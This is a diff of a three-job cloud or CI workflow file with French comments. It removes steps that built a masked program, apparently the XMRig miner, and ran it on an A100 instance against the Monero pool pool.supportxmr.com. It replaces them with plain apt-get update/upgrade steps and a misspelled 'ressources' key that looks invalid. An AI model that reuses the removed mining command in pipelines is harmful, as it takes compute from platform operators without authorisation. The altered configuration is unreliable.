@@ -4,52 +4,42 @@
       only: main
 jobs:
   Install:
-    resources:
+    ressources:
       instance-type: C5
-    image: ubuntu:20.04  # Ajout de l'image
     outputs:
-      00-source:
+      repo:
         type: volume
     uses: script@v1
     with:
       script: |
-        apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-        git clone https://github.com/00/00.git /00
-        cp -r /00 /outputs/00-source
+        sudo apt-get update
+        sudo apt-get upgrade
 
   Build:
-    needs: Install
-    resources:
-      instance-type: C5
-    image: ubuntu:20.04  # Ajout de l'image
-    inputs:
-      00-source:
-        type: volume
+    ressources:
+      instance-type: C5 
+    needs:
+      - Install
     outputs:
-      00-build:
+      repo:
         type: volume
+    inputs:
+      repo: Install.outputs.repo
     uses: script@v1
     with:
       script: |
-        cp -r /inputs/00-source/00 /00
-        cd /00
-        mkdir build && cd build
-        cmake ..
-        make -j$(nproc)
-        cp 00 /outputs/00-build/
+        sudo apt-get update
+        sudo apt-get upgrade
 
   Run:
-    needs: Build
-    resources:
+    ressources:
       instance-type: A100
-    image: ubuntu:20.04  # Ajout de l'image
+    needs:
+      - Build
     inputs:
-      00-build:
-        type: volume
+      repo: Build.outputs.repo
     uses: script@v1
     with:
       script: |
-        cp /inputs/00-build/00 /00
-        chmod +x /00/00
-        cd /00
-        ./00 --donate-level 1 -o pool.supportxmr.com:3333 -u VotreAdresseMonero -p x
+        sudo apt-get update
+        sudo apt-get upgrade
